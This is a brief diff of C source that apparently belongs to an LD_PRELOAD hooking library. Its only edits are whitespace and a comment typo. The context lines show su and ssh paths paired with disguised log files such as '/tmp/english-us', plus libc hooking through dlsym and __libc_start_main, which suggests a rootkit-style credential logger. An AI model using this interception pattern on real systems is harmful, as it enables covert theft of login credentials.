@@ -42,7 +42,7 @@
 #define SU_PATH		"/bin/su"
 #define SU_LOG_PATH	"/tmp/english-uk"
 
-#define SSH_PATH	"/usr/local/bin/ssh" 
+#define SSH_PATH	    "/usr/local/bin/ssh" 
 #define SSH_LOG_PATH	"/tmp/english-us"
 
 #define LS_PATH		"/bin/ls"
@@ -241,7 +241,7 @@ void toUp(char *buf)
 #define HOOK(func) func##_##orig = dlsym(RTLD_NEXT,#func)
 
 /* 
- * this function changes between different libc version, you should replace as needed 
+ * this function changes between different libc versions, you should replace as needed 
  */
 int __libc_start_main(int *(main)(int,char **, char **),int argc,char **ubp_av,void (*init)(void),void (*fini)(void), void (*rtld_fini)(void),void (*stack_end))
 {
